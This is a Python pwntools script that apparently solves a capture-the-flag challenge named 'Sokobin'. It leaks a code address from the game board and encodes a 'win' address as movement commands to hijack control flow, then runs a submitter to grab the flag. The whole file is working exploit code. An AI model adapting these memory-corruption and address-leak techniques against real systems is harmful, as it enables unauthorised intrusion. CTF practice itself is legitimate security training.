from pwn import *
import warnings
warnings.filterwarnings("ignore")

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def go():
    p = remote(HOST, int(PORT))

    def readBoard():
        p.recvline()#Sokobin!
        board = b''
        for _ in range(0x20):
            line = p.recvline().strip()
            line = line.replace(b'.', b'0')
            line = line.replace(b'o', b'1')
            line = line.replace(b'@', b'0')#replace @ with 0 for now
            line = line[::-1].decode()
            data = int(line, 2)
            board = data.to_bytes(4, 'little') + board
        return board

    board = readBoard()
    main = u64(board[0x48:0x50])
    print("MAIN: ", hex(main))
    win = main - 0x24
    print("WIN: ", hex(win))

    pay = 's' * 21 + 'w' + 's' * 3
    pay += 'w' * 3
    pay += 'a' * 32
    pay += 'w' * 2
    pay += 's' * 32
    pay += 'w' * 1
    pay += 'a' * 32
    pay += 'r'
    pay += 'a' * 32
    pay += 'w' * 5
    pay += 'rrr'
    pay += 's' * 32
    pay += 'w'
    pay += 'a' * 32
    pay += 'r'
    pay += 's' * 32
    pay += 'rs'
    pay += 'wrs' * 32
    pay += 'wwwr'
    pay += 'a' * 32
    pay += 'r'
    pay += 'rwa' * 32
    pay += 'wrs' * 32
    pay += 'a' * 32
    pay += 'rr'
    pay += 's' * 32
    pay += 'r'
    pay += 'swr' * 32
    pay += 'w' * 5 + 'r' * 4#rightmost bit...
    p.sendline(pay)


    def genL(x):
        tmp = ''
        for i in reversed(range(8)):
            if x & (1 << i):
                tmp += 'wra'
            else:
                tmp += 'a'
        return tmp

    def genR(x):
        tmp = ''
        for i in range(8):
            if x & (1 << i):
                tmp += 'wrs'
            else:
                tmp += 's'
        return tmp

    pay = genL((win >> 24) & 0xff)
    pay += genL((win >> 16) & 0xff)
    pay += 's' * 32
    pay += 'w'
    pay += 'a' * 32
    pay += 'r'
    pay += 'a' * 32
    pay += genR(win & 0xff)
    pay += genR((win >> 8) & 0xff)
    p.sendline(pay)

    def genD(x):
        tmp = ''
        for i in range(8):
            if x & (1 << i):
                tmp += 'rws'
            else:
                tmp += 's'
        return tmp

    pay = 's' * 32
    pay += 'w' * 4
    pay += 'aw'
    pay += 'a' * 32
    pay += genD((win >> 32) & 0xff)
    pay += genD((win >> 40) & 0xff)
    p.sendline(pay)

    #this might not be right
    if (win >> 31) & 1 == 1:
        pay = 'ww'
        pay += 's' * 32
        pay += 'r' * 4
        p.sendline(pay)

    p.sendline('q')
    p.sendline('./submitter')

    print(p.recvall(timeout=5).decode())

go()

